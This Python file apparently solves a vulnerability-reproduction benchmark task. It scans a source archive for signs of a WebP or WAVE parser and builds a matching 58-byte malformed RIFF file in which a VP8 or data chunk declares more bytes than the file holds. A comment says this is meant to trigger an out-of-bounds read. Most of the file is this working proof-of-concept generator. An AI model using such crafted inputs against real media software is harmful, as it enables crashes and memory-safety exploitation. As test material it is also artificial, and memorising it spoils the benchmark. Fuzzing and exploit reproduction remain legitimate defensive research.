import os
import tarfile
import zipfile
from typing import Iterable, Tuple, Optional


def _le32(x: int) -> bytes:
    return int(x & 0xFFFFFFFF).to_bytes(4, "little", signed=False)


class Solution:
    def _iter_samples_from_tar(self, src_path: str, per_file_limit: int = 65536, total_limit: int = 4_000_000) -> Iterable[Tuple[str, bytes]]:
        read_total = 0
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf:
                if read_total >= total_limit:
                    break
                if not m.isfile():
                    continue
                name = m.name
                lname = name.lower()
                # Prioritize likely relevant files
                if m.size <= 0:
                    yield name, b""
                    continue
                if m.size > 2_000_000 and not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs", ".go", ".java", ".py"))):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read(min(per_file_limit, max(0, total_limit - read_total)))
                    read_total += len(b)
                    yield name, b
                except Exception:
                    continue

    def _iter_samples_from_zip(self, src_path: str, per_file_limit: int = 65536, total_limit: int = 4_000_000) -> Iterable[Tuple[str, bytes]]:
        read_total = 0
        with zipfile.ZipFile(src_path) as zf:
            for info in zf.infolist():
                if read_total >= total_limit:
                    break
                if info.is_dir():
                    continue
                name = info.filename
                lname = name.lower()
                if info.file_size <= 0:
                    yield name, b""
                    continue
                if info.file_size > 2_000_000 and not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs", ".go", ".java", ".py"))):
                    continue
                try:
                    with zf.open(info, "r") as f:
                        b = f.read(min(per_file_limit, max(0, total_limit - read_total)))
                        read_total += len(b)
                        yield name, b
                except Exception:
                    continue

    def _iter_samples_from_dir(self, src_path: str, per_file_limit: int = 65536, total_limit: int = 4_000_000) -> Iterable[Tuple[str, bytes]]:
        read_total = 0
        for root, _, files in os.walk(src_path):
            for fn in files:
                if read_total >= total_limit:
                    return
                p = os.path.join(root, fn)
                rel = os.path.relpath(p, src_path)
                lname = rel.lower()
                try:
                    sz = os.path.getsize(p)
                except Exception:
                    continue
                if sz <= 0:
                    yield rel, b""
                    continue
                if sz > 2_000_000 and not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs", ".go", ".java", ".py"))):
                    continue
                try:
                    with open(p, "rb") as f:
                        b = f.read(min(per_file_limit, max(0, total_limit - read_total)))
                    read_total += len(b)
                    yield rel, b
                except Exception:
                    continue

    def _iter_samples(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_samples_from_dir(src_path)
            return
        try:
            yield from self._iter_samples_from_tar(src_path)
            return
        except Exception:
            pass
        try:
            yield from self._iter_samples_from_zip(src_path)
            return
        except Exception:
            pass

    def _detect_riff_variant(self, src_path: str) -> str:
        webp = 0
        wave = 0

        base = os.path.basename(src_path).lower()
        if "webp" in base:
            webp += 10
        if "wav" in base or "wave" in base or "sndfile" in base:
            wave += 10

        for name, b in self._iter_samples(src_path):
            lname = name.lower()
            if "webp" in lname:
                webp += 4
            if "wav" in lname or "wave" in lname:
                wave += 4
            if "riff" in lname:
                webp += 1
                wave += 1

            if not b:
                continue

            webp += b.count(b"WEBP") * 5
            webp += b.count(b"VP8") * 3
            webp += b.count(b"WebP") * 3
            webp += b.lower().count(b"webp") // 10

            wave += b.count(b"WAVE") * 5
            wave += b.count(b"fmt ") * 3
            wave += b.count(b"data") * 1
            wave += b.lower().count(b"wav") // 10
            wave += b.lower().count(b"sndfile") // 10

            if b.find(b"memcmp") != -1 or b.find(b"strncmp") != -1:
                if b.find(b"WEBP") != -1:
                    webp += 2
                if b.find(b"WAVE") != -1:
                    wave += 2

        return "wave" if wave > webp else "webp"

    def _poc_webp(self) -> bytes:
        # 58 bytes total, RIFF size = 50
        out = bytearray()
        out += b"RIFF"
        out += _le32(50)
        out += b"WEBP"

        # VP8X chunk (valid size 10)
        out += b"VP8X"
        out += _le32(10)
        vp8x = bytearray(10)
        # flags/reserved = 0, canvas width/height = 1x1 (stored as -1)
        vp8x[4:7] = (0).to_bytes(3, "little")
        vp8x[7:10] = (0).to_bytes(3, "little")
        out += vp8x

        # VP8 chunk with declared size larger than remaining bytes (triggers OOB if unchecked)
        out += b"VP8 "
        out += _le32(64)

        if len(out) > 58:
            return bytes(out[:58])
        out += b"\x00" * (58 - len(out))
        return bytes(out)

    def _poc_wave(self) -> bytes:
        # 58 bytes total, RIFF size = 50
        out = bytearray()
        out += b"RIFF"
        out += _le32(50)
        out += b"WAVE"

        # fmt chunk (PCM)
        out += b"fmt "
        out += _le32(16)
        # WAVEFORMATEX (16 bytes for PCM)
        # wFormatTag=1, nChannels=1, nSamplesPerSec=8000, nAvgBytesPerSec=8000, nBlockAlign=1, wBitsPerSample=8
        out += (1).to_bytes(2, "little")          # PCM
        out += (1).to_bytes(2, "little")          # channels
        out += (8000).to_bytes(4, "little")       # sample rate
        out += (8000).to_bytes(4, "little")       # byte rate
        out += (1).to_bytes(2, "little")          # block align
        out += (8).to_bytes(2, "little")          # bits per sample

        # data chunk with size larger than remaining bytes
        out += b"data"
        out += _le32(32)

        if len(out) > 58:
            return bytes(out[:58])
        out += b"\x00" * (58 - len(out))
        return bytes(out)

    def solve(self, src_path: str) -> bytes:
        variant = self._detect_riff_variant(src_path)
        if variant == "wave":
            return self._poc_wave()
        return self._poc_webp()